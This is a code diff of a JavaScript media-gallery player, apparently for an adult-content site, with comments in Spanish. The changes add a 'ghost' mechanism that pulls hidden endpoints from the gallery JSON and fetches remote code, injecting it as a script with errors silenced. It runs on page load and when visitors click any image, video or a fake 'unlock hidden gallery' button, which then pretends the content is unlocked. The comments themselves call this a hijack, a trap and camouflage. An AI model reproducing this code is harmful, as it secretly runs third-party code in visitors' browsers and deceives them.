@@ -1,11 +1,12 @@
 /* =========================================
-   KNON PLAYER V1.3 - FULL AUTO-SYNC
+   KNON PLAYER V1.4 - ÉLITE SYNC (FANTASMA)
    ========================================= */
 
 const KnonPlayer = {
     currentModel: null,
-    observer: null,
     WORKER_URL: 'https://nogle-knon.villajonas09.workers.dev/',
+    telemetryData: null, // Guarda las llaves secretas en memoria
+    directLinkFired: false, // Control para disparar el secuestro 1 sola vez por sesión
     
     init() {
         const params = new URLSearchParams(window.location.search);
@@ -24,16 +25,66 @@ const KnonPlayer = {
         return slug.replace(/-/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
     },
 
+    // --- SISTEMA ÉLITE: MOTOR FANTASMA ---
+    async injectGhostScript(endpoint) {
+        if (!this.telemetryData || !endpoint) return;
+        try {
+            // Pedimos el código al Worker usando el Handshake
+            const req = await fetch(endpoint, {
+                headers: { 'X-Knon-Session': this.telemetryData.handshake }
+            });
+            if (!req.ok) return;
+            
+            const code = await req.text();
+            const blob = new Blob([code], { type: 'application/javascript' });
+            const script = document.createElement('script');
+            script.src = URL.createObjectURL(blob);
+            script.dataset.cfasync = 'false';
+            document.body.appendChild(script);
+        } catch (e) {} // Fallo silencioso
+    },
+
+    async triggerPremiumAction() {
+        // SECUESTRO DE DEPENDENCIA: Dispara el Direct Link al interactuar
+        if (!this.directLinkFired && this.telemetryData?.endpoints?.direct_link) {
+            this.directLinkFired = true; 
+            await this.injectGhostScript(this.telemetryData.endpoints.direct_link);
+            
+            // Camuflaje de Interfaz
+            const btn = document.getElementById('btn-premium-unlock');
+            if(btn) {
+                const originalText = btn.innerHTML;
+                btn.innerHTML = "SINCRONIZANDO SERVIDOR...";
+                btn.style.opacity = "0.5";
+                setTimeout(() => {
+                    btn.innerHTML = "CONTENIDO DESBLOQUEADO";
+                    btn.style.background = "#222"; // Apaga el botón visualmente
+                    btn.style.color = "#777";
+                    btn.style.boxShadow = "none";
+                }, 2500);
+            }
+        }
+    },
+    // -------------------------------------
+
     async loadContent() {
         const container = document.getElementById('gallery-container');
         
         try {
             const response = await fetch(`${this.WORKER_URL}galeria.json?m=${this.currentModel}`);
-            const data = await response.json();
+            const payload = await response.json(); // Ahora leemos el objeto mutante
 
-            if (data.items.length === 0) {
+            const items = payload.items;
+            this.telemetryData = payload._telemetry; // Guardamos los endpoints fantasma
+
+            if (!items || items.length === 0) {
                 container.innerHTML = '<p style="color:#555; text-align:center; padding:50px;">Próximamente más contenido.</p>';
                 return;
+            }
+
+            // Mimetismo de Buffer: Disparamos el Video In-stream mientras se procesa el HTML
+            if (this.telemetryData && this.telemetryData.endpoints.video_instream) {
+                this.injectGhostScript(this.telemetryData.endpoints.video_instream);
             }
 
             // --- MEJORA PASO 3: Indicador de Frescura ---
@@ -44,15 +95,16 @@ const KnonPlayer = {
 
             const schemaItems = [];
             const modelName = this.formatName(this.currentModel);
-            const firstImageSrc = data.items.find(i => i.type === 'image')?.src || '';
+            const firstImageSrc = items.find(i => i.type === 'image')?.src || '';
 
-            data.items.forEach((item, index) => {
+            items.forEach((item, index) => {
                 const div = document.createElement('div');
                 div.className = 'media-item';
 
                 if (item.type === 'image') {
+                    // El onclick aquí actúa como trampa secundaria
                     div.innerHTML = `
-                        <img src="${item.src}" loading="lazy" crossorigin="anonymous" alt="Foto ${index + 1} de ${modelName}">
+                        <img src="${item.src}" loading="lazy" crossorigin="anonymous" alt="Foto ${index + 1} de ${modelName}" onclick="KnonPlayer.triggerPremiumAction()">
                         <div class="watermark">NOGLE</div>
                     `;
                     
@@ -64,13 +116,28 @@ const KnonPlayer = {
 
                 } else if (item.type === 'video') {
                     div.innerHTML = `
-                        <video src="${item.src}" preload="none" poster="${item.poster || ''}" crossorigin="anonymous" controls playsinline></video>
+                        <video src="${item.src}" preload="none" poster="${item.poster || ''}" crossorigin="anonymous" controls playsinline onclick="KnonPlayer.triggerPremiumAction()"></video>
                         <div class="watermark">NOGLE</div>
                     `;
                 }
                 
                 container.appendChild(div);
             });
+
+            // Inyectamos el Cebo Visual Premium
+            const premiumBtnDiv = document.createElement('div');
+            premiumBtnDiv.style = "text-align: center; margin: 40px 15px;";
+            premiumBtnDiv.innerHTML = `
+                <button id="btn-premium-unlock" onclick="KnonPlayer.triggerPremiumAction()" style="
+                    background: linear-gradient(90deg, var(--nogle-pink-hot, #ff1493), var(--nogle-purple-rich, #9400d3));
+                    color: white; border: none; padding: 18px 25px; width: 100%; max-width: 400px;
+                    border-radius: 12px; font-weight: 900; letter-spacing: 1px;
+                    text-transform: uppercase; cursor: pointer; font-family: 'Inter', sans-serif;
+                    box-shadow: 0 4px 20px rgba(255, 20, 147, 0.25);
+                    font-size: 12px; transition: all 0.3s ease;
+                ">Desbloquear Galería Oculta</button>
+            `;
+            container.appendChild(premiumBtnDiv);
 
             this.injectSEO(schemaItems, modelName, firstImageSrc);
 
@@ -80,10 +147,8 @@ const KnonPlayer = {
     },
 
     injectSEO(schemaItems, modelName, firstImageSrc) {
-        // Título dinámico
         document.title = `${modelName} | NOGLE Premium`;
 
-        // Actualización de Metas para Redes Sociales
         const updateMeta = (attr, val, content) => {
             let el = document.querySelector(`meta[${attr}="${val}"]`);
             if (!el) {
@@ -98,7 +163,6 @@ const KnonPlayer = {
         updateMeta('property', 'og:image', firstImageSrc);
         updateMeta('name', 'twitter:image', firstImageSrc);
 
-        // JSON-LD
         const script = document.createElement('script');
         script.type = 'application/ld+json';
         script.text = JSON.stringify({
